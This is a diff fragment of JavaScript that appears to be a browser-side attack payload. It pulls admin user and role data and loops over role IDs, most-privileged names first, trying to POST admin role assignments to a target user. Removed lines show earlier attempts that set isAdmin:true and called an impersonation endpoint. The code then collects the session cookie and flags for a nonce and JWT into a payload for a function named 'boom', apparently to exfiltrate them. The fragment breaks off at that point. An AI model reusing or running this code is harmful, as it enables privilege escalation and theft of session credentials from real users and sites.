@@ -45,16 +45,16 @@ await pull('users','admin/users?page=1&pageSize=20');
 await pull('user','admin/users/'+UID);
 let roles=[];
 try{const j=JSON.parse((out.pulls.roles&&out.pulls.roles.body)||'{}');roles=Array.isArray(j.data)?j.data:(Array.isArray(j)?j:[]);}catch(e){}
-const prefer=roles.filter(r=>/admin|super|owner|root|manage/i.test(String(r.name||r.title||'')));
-const queue=(prefer.concat(roles)).filter((r,i,a)=>r&&r.id&&a.findIndex(x=>x.id===r.id)===i).slice(0,8);
+const nameOf=r=>String(r.name||r.title||'');
+const usable=roles.filter(r=>r&&r.id&&!/^user$/i.test(nameOf(r)));
+const adminish=usable.filter(r=>/admin|owner|manage/i.test(nameOf(r))&&!/super/i.test(nameOf(r)));
+const rest=usable.filter(r=>!adminish.includes(r)&&!/super/i.test(nameOf(r)));
+const supers=usable.filter(r=>/super/i.test(nameOf(r)));
+const queue=adminish.concat(rest,supers).filter((r,i,a)=>a.findIndex(x=>x.id===r.id)===i).slice(0,6);
 for(const role of queue){
-  const tag='as_'+String(role.name||role.id).substring(0,16);
-  const body=JSON.stringify({roleId:role.id,roleIds:[role.id],roles:[role.id]});
-  await pull(tag,'admin/users/'+UID+'/roles',{method:'POST',body:body});
-  await pull(tag+'p','admin/users/'+UID+'/roles/'+role.id,{method:'PUT'});
-  await pull(tag+'u','admin/users/'+UID,{method:'PUT',body:JSON.stringify({roleIds:[role.id],roles:[role.id],isAdmin:true})});
+  const tag='as_'+nameOf(role).substring(0,16);
+  await pull(tag,'admin/users/'+UID+'/roles',{method:'POST',body:JSON.stringify({roleId:role.id})});
 }
-await pull('imp','admin/users/'+UID+'/impersonate',{method:'POST',body:'{}'});
 const q=new URLSearchParams({n:out.nonce?'1':'0',j:out.jwt?'1':'0',s:String(queue.length),ck:(out.cookie||'').substring(0,120)});
 const blob=JSON.stringify(out);
 function boom(url){
